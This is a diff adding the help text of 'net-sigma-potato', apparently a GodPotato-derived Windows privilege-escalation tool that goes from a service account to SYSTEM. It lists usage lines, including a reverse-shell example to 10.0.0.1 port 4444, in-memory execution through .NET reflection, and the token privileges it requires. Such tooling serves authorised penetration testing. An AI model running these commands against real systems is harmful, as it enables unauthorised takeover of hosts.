@@ -1,0 +1,18 @@
+ABOUT
+    Enhanced GodPotato derivative for privilege escalation from service account to
+    SYSTEM. Supports disk execution, .NET reflection, PowerShell commands, and
+    built in reverse shell.
+
+USAGE:
+    net-sigma-potato --- <command>
+    net-sigma-potato --- --revshell <ip> <port>
+    net-sigma-potato --- --help
+
+EXAMPLES:
+    net-sigma-potato --- whoami
+    net-sigma-potato --- cmd.exe /c whoami
+    net-sigma-potato --- --revshell 10.0.0.1 4444
+
+NOTES:
+    Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
+    Supports in memory execution via [SigmaPotato]::Main('<command>') reflection.
